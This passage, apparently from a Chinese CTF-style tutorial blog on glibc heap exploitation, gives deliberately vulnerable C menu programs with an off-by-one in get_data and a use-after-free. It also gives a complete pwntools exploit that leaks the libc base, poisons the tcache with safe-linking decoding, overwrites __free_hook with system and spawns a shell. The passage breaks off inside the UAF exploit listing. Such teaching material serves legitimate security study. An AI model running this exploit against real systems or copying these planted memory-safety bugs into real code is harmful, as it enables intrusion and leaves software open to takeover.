class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> size_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_data</span><span class="hljs-params">(<span class="hljs-type">char</span> *data,<span class="hljs-type">int</span> len)</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;=len;i++)&#123;<br>        read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>              <span class="hljs-keyword">return</span>;<br>        data[i]=buf[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;=<span class="hljs-number">20</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    size_list[ind]=size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    chunk_list[ind]=<span class="hljs-number">0</span>;<br>    size_list[ind]=<span class="hljs-number">0</span>;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> * buf=chunk_list[ind];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    get_data(buf,size_list[ind]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    edit();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;    <br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="off-by-one-示例分析">off by one 示例分析</h3>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_one-3.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p>
+<p><strong>get_data函数代码</strong><br>
+<img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_one-5.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    利用get_data中可以多写入一个字节的漏洞，</span><br><span class="hljs-string">    可以修改下一个chunk的size字段的第一个字节</span><br><span class="hljs-string">    就可以构造payload使两个chunk合并，释放之后，将其放入large bin中</span><br><span class="hljs-string">    来获取libc地址，然后获取chunk地址来构造tcache bin的结构</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;obo&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x4f8</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x58</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p8(<span class="hljs-number">0x61</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x4f8</span>)<br>show(<span class="hljs-number">1</span>)<br>list_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_arena=list_d-<span class="hljs-number">0x4a0</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br>show(<span class="hljs-number">2</span>)<br>heap_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_3=calc_fd(heap_d,<span class="hljs-number">0x290</span>+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x500</span>+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x10</span>)-<span class="hljs-number">0x10</span><br>heap_2=heap_3-<span class="hljs-number">0x60</span><br><br>edit(<span class="hljs-number">2</span>,p64(en_fd(heap_2+<span class="hljs-number">0x10</span>,free_hook)))<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="UAF-use-after-free">UAF(use after free)</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    程序在释放chunk时，忘记将指针清空，</span><br><span class="hljs-comment">    导致释放chunk之后依旧可以获取或修改chunk内容</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    gcc uaf.c -o uaf</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> size_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_data</span><span class="hljs-params">(<span class="hljs-type">char</span> *data,<span class="hljs-type">int</span> len)</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>        read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>              <span class="hljs-keyword">return</span>;<br>        data[i]=buf[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;=<span class="hljs-number">20</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    size_list[ind]=size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> * buf=chunk_list[ind];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    get_data(buf,size_list[ind]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    edit();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ; <br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="UAF-示例分析">UAF 示例分析</h3>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-uaf.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_one-3.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-uaf-1.jpg" srcset="/img/loading.gif" lazyload alt="get_data函数代码" title="get_data函数代码"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 